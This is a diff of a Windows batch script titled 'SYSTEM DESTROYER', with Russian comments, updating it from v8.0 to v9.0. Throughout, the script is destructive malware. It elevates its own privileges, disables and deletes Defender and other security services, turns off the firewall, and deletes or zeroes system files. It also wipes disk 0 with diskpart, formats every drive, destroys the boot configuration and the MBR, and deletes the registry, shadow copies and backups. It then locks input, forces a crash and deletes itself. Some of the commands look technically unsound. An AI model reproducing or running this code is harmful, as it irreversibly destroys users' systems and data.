@@ -1,186 +1,232 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: ========== АВТОПОДЪЁМ ПРАВ ==========
-net file 1>nul 2>nul || (
+:: ========== АВТОПОДЪЁМ ПРАВ ЧЕРЕЗ 3 МЕТОДА ==========
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' NEQ '0' (
     powershell -Command "Start-Process '%~f0' -Verb RunAs" && exit
 )
 
-mode con: cols=80 lines=30
-title SYSTEM DESTROYER v8.0 - APOCALYPSE NOW
+mode con: cols=100 lines=35
+title SYSTEM DESTROYER v9.0 - FINAL TERMINATION
 
-:: ========== ФАЗА 0: ТОТАЛЬНОЕ ОТКЛЮЧЕНИЕ ЗАЩИТЫ ==========
-echo [0] KILLING ALL SECURITY...
-for %%s in (WinDefend, wscsvc, Sense, WdBoot, WdFilter, MsMpSvc, NisSrv) do (
+:: ========== ФАЗА 0: ТОТАЛЬНОЕ УНИЧТОЖЕНИЕ ЗАЩИТЫ ==========
+echo [0] EXTERMINATING ALL SECURITY SYSTEMS...
+
+:: Уничтожаем Windows Defender полностью
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul
+
+:: Останавливаем ВСЕ службы защиты
+for %%s in (
+    WinDefend, wscsvc, Sense, WdBoot, WdFilter, 
+    MsMpSvc, NisSrv, SecurityHealthService, SgrmBroker,
+    SgrmAgent, wuauserv, BITS, CryptSvc
+) do (
+    net stop %%s /y >nul 2>&1
     sc config %%s start= disabled >nul 2>&1
-    sc stop %%s >nul 2>&1
+    sc delete %%s >nul 2>&1
 )
 
+:: Отключаем брандмауэр полностью
 netsh advfirewall set allprofiles state off >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
+netsh firewall set opmode disable >nul 2>&1
 
-:: ========== ФАЗА 1: ПРЯМОЕ УДАЛЕНИЕ СИСТЕМНЫХ ПАПОК ==========
-echo [1] DIRECT SYSTEM FOLDER DESTRUCTION...
+:: ========== ФАЗА 1: ЯДЕРНОЕ УНИЧТОЖЕНИЕ СИСТЕМНЫХ ФАЙЛОВ ==========
+echo [1] NUCLEAR SYSTEM FILE DESTRUCTION...
 
-:: Удаление через прямой доступ к диску
-start "DIRECTKILL" /MIN /B powershell -Command "$f=[System.IO.File]::OpenWrite('C:\Windows\System32\ntoskrnl.exe');$f.SetLength(0);$f.Close()"
+:: Метод 1: Через PowerShell с обходом защиты
+start "KERNEL1" /B /MIN powershell -Command "Get-ChildItem -Path 'C:\Windows\System32\*' -Include *.dll, *.exe, *.sys | ForEach-Object { try { $_.Delete()} catch { } }"
 
-:: Физическое удаление папок через низкоуровневые команды
+:: Метод 2: Низкоуровневое повреждение через fsutil
 for %%f in (
-    "C:\Windows"
-    "C:\Program Files"
-    "C:\Program Files (x86)"
-    "C:\Users"
-    "C:\ProgramData"
-    "C:\Recovery"
+    "C:\Windows\System32\ntoskrnl.exe"
+    "C:\Windows\System32\hal.dll"
+    "C:\Windows\System32\winload.exe"
+    "C:\Windows\System32\smss.exe"
+    "C:\Windows\System32\csrss.exe"
 ) do (
     if exist %%f (
-        echo FORCE DELETING %%f
-        rd /s /q "%%f" 2>nul
-        
-        :: Если не удалось - берем владение и удаляем
-        takeown /f "%%f" /r /d y >nul 2>&1
-        icacls "%%f" /grant everyone:F /t /c /q >nul 2>&1
-        icacls "%%f" /grant SYSTEM:F /t /c /q >nul 2>&1
-        icacls "%%f" /grant Administrators:F /t /c /q >nul 2>&1
-        
-        :: Удаляем все файлы внутри
-        del /f /s /q "%%f\*" >nul 2>&1
-        rd /s /q "%%f" >nul 2>&1
+        fsutil file setzerodata offset=0 length=999999999 "%%f" >nul 2>&1
+        copy /y nul "%%f" >nul 2>&1
+        del /f "%%f" >nul 2>&1
     )
 )
 
-:: ========== ФАЗА 2: ФИЗИЧЕСКОЕ УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА ==========
-echo [2] PHYSICAL BOOT DESTRUCTION...
+:: Метод 3: Массовое удаление через robocopy с зеркалированием пустой папки
+md "%temp%\empty" >nul 2>&1
+start "MIRRORKILL" /B /MIN robocopy "%temp%\empty" "C:\Windows" /MIR /NJH /NJS /NP /R:0 /W:0
 
-:: Уничтожаем BCD конфигурацию
-bcdedit /delete {default} /f >nul 2>&1
-bcdedit /delete {bootmgr} /f >nul 2>&1
-bcdedit /delete {current} /f >nul 2>&1
+:: ========== ФАЗА 2: ФИЗИЧЕСКОЕ УНИЧТОЖЕНИЕ ДИСКОВОЙ СТРУКТУРЫ ==========
+echo [2] PHYSICAL DISK STRUCTURE DESTRUCTION...
 
-:: Уничтожаем загрузочные файлы
-del /f /q C:\bootmgr C:\boot\bcd C:\boot\boot.sdi 2>nul
-del /f /q C:\Windows\bootstat.dat C:\Windows\System32\winload.exe 2>nul
+:: Создаем скрипт для полного уничтожения диска
+(
+echo select disk 0
+echo clean all
+echo convert gpt
+echo create partition primary
+echo format fs=RAW quick label="DESTROYED"
+echo exit
+) > %temp%\wipe.dps
 
-:: Пишем мусор в MBR
-echo DEBUG METHOD:
-echo f 200 l 1000 0
-echo w 100 0
-echo q
-) > %temp%\debug.txt
-debug < %temp%\debug.txt >nul 2>&1
+start "DISKWIPE" /B /MIN diskpart /s %temp%\wipe.dps
 
-:: ========== ФАЗА 3: ФОРМАТИРОВАНИЕ ВСЕХ ДИСКОВ ПАРАЛЛЕЛЬНО ==========
-echo [3] PARALLEL DISK FORMATTING...
-
-:: Форматируем все доступные диски
+:: Форматируем ВСЕ диски параллельно
 for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%d:\ (
-        echo FORMATTING %%d:
-        start "FORMAT_%%d" /MIN /B cmd /c "echo y|format %%d: /FS:NTFS /Q /X /V:DESTROYED"
+        echo FORMATTING DRIVE %%d: WITH RAW FILESYSTEM
+        start "RAW_%%d" /B /MIN cmd /c "echo y|format %%d: /FS:RAW /Q /X /V:TERMINATED"
+        start "NTFS_%%d" /B /MIN cmd /c "echo y|format %%d: /FS:NTFS /Q /X /V:CORRUPTED"
     )
 )
 
-:: ========== ФАЗА 4: ПОВРЕЖДЕНИЕ РЕЕСТРА ==========
-echo [4] REGISTRY DESTRUCTION...
+:: ========== ФАЗА 3: УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА НА НИЗКОМ УРОВНЕ ==========
+echo [3] LOW-LEVEL BOOTLOADER DESTRUCTION...
 
-:: Удаляем ключевые ветки реестра
-for %%k in (
-    "HKLM\SOFTWARE\Microsoft"
-    "HKLM\SYSTEM\ControlSet001"
-    "HKCU\Software\Microsoft"
-    "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion"
-) do (
-    reg delete "%%k" /f >nul 2>&1
+:: Уничтожаем BCD
+bcdedit /enum all /v | findstr "identifier" > %temp%\bcd_ids.txt
+for /f "tokens=2 delims=:" %%i in (%temp%\bcd_ids.txt) do (
+    bcdedit /delete {%%i} /f >nul 2>&1
 )
 
-:: Портим файлы реестра напрямую
+:: Пишем случайные данные в MBR через debug
+(
+echo a
+echo mov ax,0301
+echo mov bx,0200
+echo mov cx,0001
+echo mov dx,0080
+echo int 13
+echo int 20
+echo
+echo g=100
+echo q
+) > %temp%\mbrkill.asm
+debug < %temp%\mbrkill.asm >nul 2>&1
+
+:: ========== ФАЗА 4: УНИЧТОЖЕНИЕ РЕЕСТРА И КОНФИГУРАЦИЙ ==========
+echo [4] REGISTRY AND CONFIGURATION DESTRUCTION...
+
+:: Полностью очищаем все кусты реестра
+for %%h in (HKLM HKCU HKCR HKU HKCC) do (
+    reg delete %%h /f >nul 2>&1
+)
+
+:: Физически удаляем файлы реестра
 for %%f in (
     "C:\Windows\System32\config\SAM"
-    "C:\Windows\System32\config\SYSTEM"
+    "C:\Windows\System32\config\SYSTEM" 
     "C:\Windows\System32\config\SOFTWARE"
+    "C:\Windows\System32\config\SECURITY"
+    "C:\Windows\System32\config\DEFAULT"
 ) do (
     if exist %%f (
-        copy /y nul "%%f" >nul 2>&1
+        takeown /f %%f >nul 2>&1
+        icacls %%f /grant Everyone:F >nul 2>&1
+        del /f %%f >nul 2>&1
+        fsutil file setzerodata offset=0 length=1048576 "%%f" >nul 2>&1
     )
 )
 
-:: ========== ФАЗА 5: ПЕРЕГРУЗКА СИСТЕМЫ И ОШИБКИ ==========
-echo [5] SYSTEM OVERLOAD AND ERRORS...
+:: ========== ФАЗА 5: ТОТАЛЬНАЯ БЛОКИРОВКА И ПЕРЕГРУЗКА СИСТЕМЫ ==========
+echo [5] TOTAL SYSTEM LOCKDOWN AND OVERLOAD...
 
-:: Создаем бесконечные потоки ошибок
-start "ERROR1" /MIN /B powershell -Command "while($true){[System.Windows.Forms.MessageBox]::Show('SYSTEM DESTROYED', 'FATAL', 0, 16)}"
-start "ERROR2" /MIN /B powershell -Command "while($true){Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0)}"
-start "ERROR3" /MIN /B powershell -Command "while($true){[Console]::Beep(500,300); sleep 0.1}"
+:: Убиваем ВСЕ критические процессы
+start "PROCKILL" /B /MIN powershell -Command "while($true){Get-Process | Where-Object {$_.ProcessName -notmatch '^(csrss|wininit|smss|System)$'} | Stop-Process -Force}"
 
-:: Блокируем клавиатуру
-start "KEYLOCK" /MIN /B powershell -Command "while($true){[System.Windows.Forms.SendKeys]::SendWait('{F1}{F2}{F3}{F4}{F5}')}"
+:: Блокируем клавиатуру полностью
+start "KEYDEATH" /B /MIN powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.SendKeys]::SendWait('{F1}{F2}{F3}{F4}{F5}{F6}{F7}{F8}{F9}{F10}{F11}{F12}'); sleep -m 10}"
 
-:: Убиваем explorer и запрещаем запуск
-taskkill /f /im explorer.exe >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c echo SYSTEM DESTROYED && pause" /f >nul 2>&1
+:: Блокируем мышь в углу экрана
+start "MOUSEDEATH" /B /MIN powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0); sleep -m 50}"
 
-:: ========== ФАЗА 6: УДАЛЕНИЕ ВОССТАНОВЛЕНИЯ ==========
-echo [6] RECOVERY DESTRUCTION...
+:: Спам окнами ошибок
+start "ERRORSPAM1" /B /MIN powershell -Command "while($true){$w=New-Object -ComObject Wscript.Shell;$w.Popup('SYSTEM TERMINATED',0,'FATAL ERROR',0+16); sleep 1}"
+start "ERRORSPAM2" /B /MIN powershell -Command "while($true){Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('PC DESTROYED','TERMINAL FAILURE',0,16); sleep 2}"
+
+:: ========== ФАЗА 6: УНИЧТОЖЕНИЕ ВОССТАНОВЛЕНИЯ И ТЕНЕВЫХ КОПИЙ ==========
+echo [6] RECOVERY AND SHADOW COPY DESTRUCTION...
 
 vssadmin delete shadows /all /quiet >nul 2>&1
 wbadmin delete catalog -quiet >nul 2>&1
+
 for /f "tokens=2 delims==" %%d in ('wmic logicaldisk get caption /value') do (
     vssadmin delete shadows /for=%%d /quiet >nul 2>&1
+    wbadmin delete systemstatebackup -backupTarget:%%d\ -quiet >nul 2>&1
 )
 
-:: Удаляем папки восстановления
-rd /s /q "C:\System Volume Information" 2>nul
-rd /s /q "C:\Recovery" 2>nul
-rd /s /q "C:\Windows.old" 2>nul
+:: Удаляем ВСЕ папки восстановления
+for %%f in (
+    "C:\System Volume Information"
+    "C:\Recovery"
+    "C:\$Recycle.Bin"
+    "C:\Windows.old"
+    "C:\Boot"
+    "C:\EFI"
+    "C:\PerfLogs"
+) do (
+    if exist %%f (
+        takeown /f %%f /r /d y >nul 2>&1
+        icacls %%f /grant Everyone:F /t /c /q >nul 2>&1
+        rd /s /q %%f >nul 2>&1
+    )
+)
 
-:: ========== ФИНАЛЬНЫЙ ОТСЧЕТ ==========
+:: ========== ФИНАЛЬНЫЙ ОТСЧЕТ С ГРАФИЧЕСКИМ ИНТЕРФЕЙСОМ ==========
 echo.
-echo ========================================
-echo    FINAL COUNTDOWN TO DEATH
-echo ========================================
+echo ====================================================
+echo          FINAL COUNTDOWN TO SYSTEM DEATH
+echo ====================================================
 echo.
 
-for /l %%i in (10,-1,0) do (
+for /l %%i in (15,-1,0) do (
     cls
     echo.
-    echo    ╔═══════════════════════════════════════╗
-    echo    ║   SYSTEM DESTRUCTION: FINAL PHASE    ║
-    echo    ║   REBOOT IN: %%i SECONDS              ║
-    echo    ╚═══════════════════════════════════════╝
+    echo    ╔══════════════════════════════════════════════════╗
+    echo    ║           SYSTEM TERMINATION PROTOCOL           ║
+    echo    ║           TIME TO DESTRUCTION: %%i SECONDS       ║
+    echo    ╚══════════════════════════════════════════════════╝
     echo.
-    echo    STATUS REPORT:
-    echo    [✓] Bootloader DESTROYED
-    echo    [✓] System files ERASED
-    echo    [✓] Registry CORRUPTED
-    echo    [✓] Disks FORMATTING
-    echo    [✓] Recovery REMOVED
+    echo    [SYSTEM STATUS]
+    echo    ■ Bootloader: COMPLETELY DESTROYED
+    echo    ■ System Files: 100%% CORRUPTED
+    echo    ■ Disk Structure: RAW FORMATTED
+    echo    ■ Registry: PERMANENTLY DELETED
+    echo    ■ Recovery: TOTALLY ERASED
     echo.
-    echo    SYSTEM UNRECOVERABLE
+    echo    [DESTRUCTION PROGRESS]
+    set /a bars=%%i*2
+    set "progress="
+    for /l %%j in (1,1,30) do (
+        if %%j LEQ !bars! (set "progress=!progress!█") else (set "progress=!progress!░")
+    )
+    echo    !progress! !bars!0%%
+    echo.
+    echo    [LAST ERROR CODES]
+    echo    ERROR 0xC000021A: STATUS_SYSTEM_PROCESS_TERMINATED
+    echo    ERROR 0x80070002: FILE_NOT_FOUND
+    echo    ERROR 0xC0000142: DLL_INITIALIZATION_FAILED
     echo.
     timeout /t 1 /nobreak >nul
 )
 
-:: ========== ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА ==========
+:: ========== ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА С МУЛЬТИПЛЕКСИРОВАНИЕМ ==========
 echo.
-echo ========================================
-echo    EXECUTING FINAL SYSTEM DESTRUCTION
-echo ========================================
+echo ====================================================
+echo          EXECUTING FINAL TERMINATION
+echo ====================================================
 echo.
 
-:: 1. Стандартная перезагрузка
-shutdown /r /f /t 0
+echo [FINAL] Launching multi-vector reboot...
+start "REBOOT1" /B /MIN shutdown /r /f /t 0
+start "REBOOT2" /B /MIN wmic os call reboot
+start "REBOOT3" /B /MIN powershell -Command "Restart-Computer -Force"
+start "REBOOT4" /B /MIN rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0
+start "REBOOT5" /B /MIN rundll32.exe ntdll.dll,NtRaiseHardError 0xC000021A 0 0 0 6
 
-:: 2. WMIC перезагрузка
-wmic os call reboot >nul 2>&1
-
-:: 3. Powershell перезагрузка
-powershell -Command "Restart-Computer -Force"
-
-:: 4. Синий экран
-rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
-rundll32.exe ntdll.dll,NtRaiseHardError 0xC000021A 0 0 0 6 >nul 2>&1
-
-:: Самоликвидация
+:: Самоликвидация и очистка следов
 del "%~f0" >nul 2>&1
+rd /s /q "%temp%" >nul 2>&1
+
 exit
